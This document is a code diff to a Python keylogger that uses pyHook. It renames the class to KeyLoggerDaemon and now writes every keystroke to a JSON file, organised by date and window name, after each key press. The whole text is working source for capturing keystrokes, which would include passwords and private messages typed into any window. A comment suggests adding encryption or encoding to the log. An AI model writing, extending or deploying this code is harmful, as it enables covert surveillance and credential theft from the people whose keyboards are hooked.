@@ -5,16 +5,17 @@ import pyHook
 import pythoncom
 
 
-class Logger:
+class KeyLoggerDaemon:
     """
     A basic implementation of a python key logger
     stores logged keys per-window per-date in a json format
+
     full log is stored in mem on a return key or tab key
     the buffer is written to disk.
 
     buffer structure - {date: {windows name: [list of keystrokes]}}
     """
-    LOG_FILE: str = "LOG.txt"  # log file path
+    LOG_FILE: str = "LOG.json"  # log file path
 
     def __init__(self):
         self.hook = hook = pyHook.HookManager()
@@ -22,10 +23,8 @@ class Logger:
 
         try:
             self.buffer = self.__load_buffer()
-            self.buffer[str(date.today())] = dict()  # create new log dict for current date
         except (FileNotFoundError, json.decoder.JSONDecodeError):
-            self.buffer = {str(date.today()): dict()}
-            open(self.LOG_FILE, "w").close()
+            self.buffer = dict()
 
     def __write_event(self, event: pyHook.KeyboardEvent):
         """
@@ -33,16 +32,18 @@ class Logger:
         if tab or return are in the event the buffer is written out
         """
         print(event.WindowName, event.Key)  # debug
+        print(self.buffer)
 
         if str(date.today()) not in self.buffer:  # check if current date in dict
             self.buffer[str(date.today())] = dict()
+
         if event.WindowName not in self.buffer[str(date.today())]:  # check if window already in dict
             self.buffer[str(date.today())][event.WindowName] = list()
 
         self.buffer[str(date.today())][event.WindowName].append(event.Key)  # add event to buffer
 
-        if event.Ascii == 13 or event.Ascii == 9:  # when enter or tab is pressed the buffer is dumped
-            self.__dump_buffer()
+        # if event.Ascii == 13 or event.Ascii == 9:  # when enter or tab is pressed the buffer is dumped
+        self.__dump_buffer()  # dump buffer, inefficient but works more reliably
 
         return True  # required by hook manager
 
@@ -52,11 +53,11 @@ class Logger:
         other wise will be over written on next write
 
         Custom loading functionality can be added here
-        e.g encryption, encoding, etc.
+        e.g decryption, decoding, etc.
 
         :return: buffer
         """
-        return json.loads(open(self.LOG_FILE, "r").read())
+        return json.load(open(self.LOG_FILE, "r"))
 
     def __dump_buffer(self):
         """
@@ -66,9 +67,9 @@ class Logger:
         Custom dumping functionality can be added here
         e.g encryption, encoding, etc.
         """
-        open(self.LOG_FILE, "w").write(json.dumps(self.buffer))
+        json.dump(self.buffer, open(self.LOG_FILE, "w"))
 
-    def activate_hook(self):
+    def watch(self):
         """
         Starts the hook event loop
         """
@@ -76,4 +77,4 @@ class Logger:
         pythoncom.PumpMessages()
 
 
-Logger().activate_hook()
+KeyLoggerDaemon().watch()
